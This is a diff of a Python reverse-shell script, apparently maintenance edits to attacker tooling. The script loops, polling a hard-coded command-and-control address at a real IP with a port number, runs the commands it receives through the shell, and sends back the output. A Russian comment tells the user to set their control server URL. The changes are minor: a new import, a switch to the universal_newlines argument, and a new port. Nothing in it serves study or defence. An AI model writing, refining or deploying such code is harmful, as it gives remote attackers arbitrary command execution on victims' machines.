@@ -1,6 +1,7 @@
 import requests
 import subprocess
 import time
+import os
 
 def reverse_shell(server_url):
     while True:
@@ -30,7 +31,9 @@ def reverse_shell(server_url):
                     result = f"No such directory: {command[3:]}"
             else:
                 try:
-                    result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
+                    result = subprocess.check_output(
+                        command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True
+                    )
                 except subprocess.CalledProcessError as e:
                     result = e.output
 
@@ -46,4 +49,4 @@ def reverse_shell(server_url):
             time.sleep(5)
 
 # Укажите URL вашего управляющего сервера
-reverse_shell("http://89.207.88.72:47991")
+reverse_shell("http://89.207.88.72:47992")
